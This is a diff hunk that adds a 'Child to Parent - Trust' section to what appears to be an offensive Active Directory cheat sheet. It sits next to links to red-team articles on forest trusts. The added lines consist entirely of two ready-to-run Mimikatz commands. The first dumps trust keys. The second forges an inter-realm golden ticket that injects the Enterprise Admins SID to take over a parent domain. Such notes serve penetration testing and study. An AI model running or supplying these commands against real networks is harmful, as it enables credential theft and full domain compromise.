@@ -831,7 +831,13 @@ https://blog.harmj0y.net/redteaming/not-a-security-boundary-breaking-forest-trus
 
 https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1
 
+#### Child to Parent - Trust
 
+```Invoke-Mimikatz -Command '"lsadump::trust /patch"'```
+
+```
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:ecorp.bcorp.lab /sid:S-1-5-21-<currentdomainSID> /sids:S-1-5-21-<parentdomainSID>-519 /rc4:f052addf1d43f864a7d0c21cbce440c9 /service:krbtgt /target:bcorp.lab /ticket:C:\Temp\trust_tkt.kirbi"'
+```
 
 # MS SQL
 
